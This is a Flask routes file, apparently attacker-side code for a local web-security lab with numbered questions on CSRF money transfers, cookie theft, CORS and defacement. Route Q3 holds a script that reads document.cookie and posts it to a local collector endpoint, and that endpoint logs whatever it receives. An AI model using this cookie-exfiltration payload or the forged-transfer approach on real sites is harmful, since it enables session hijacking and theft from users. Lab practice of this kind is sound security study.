from cmath import log
from distutils.log import Log
import json
from flask import render_template, redirect, request, flash, make_response
from webapp import app
from requests import Request, Session
import requests
from bs4 import BeautifulSoup
import os
from flask_cors import cross_origin


###################################
## Transfer functionality for Q2 ##
###################################
#=========[Occurs because GET and POST operations are interchangable, along with CSRF tokens not working]==============#

@app.route('/Q2', methods=['GET', 'POST'])
def doneLoginPage():
    return render_template("q2.html", reciever="Gustaf0")



#####################
## Cookie Alert Q3 ##
#####################

@app.route('/Q3', methods=['GET', 'POST'])
def cookieGet():
    script = "<script>cookies = document.cookie.split(); console.log(cookies); fetch('http://127.0.0.1:3030/recieve', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({'cookies': cookies})});</script>"

    return render_template("q3.html", script=script)


#########################
## Test directories Q4 ##
#########################
#========[CORS seems to only apply to certain requests https://stackoverflow.com/questions/36958999/cors-is-it-a-client-side-thing-a-server-side-thing-or-a-transport-level-thin]==========#
@app.route('/Q4', methods=['GET', 'POST'])
def Q4():
    webSession = Session()

    url = "http://127.0.0.1:5000/Q4"
    testScript = ""
    form = {
        "reciepient": "Gustaf0",
        "money": ""
    }


    return render_template("q4.html")


###############
## Deface Q5 ##
###############
@app.route("/Q5", methods=["GET", "POST"])
def Q5():
    return


@app.route("/recieve", methods=["GET", "POST"])
@cross_origin()
def recieve():
    payload = request.get_json()
    print(payload)
    return "Everthing is good", 200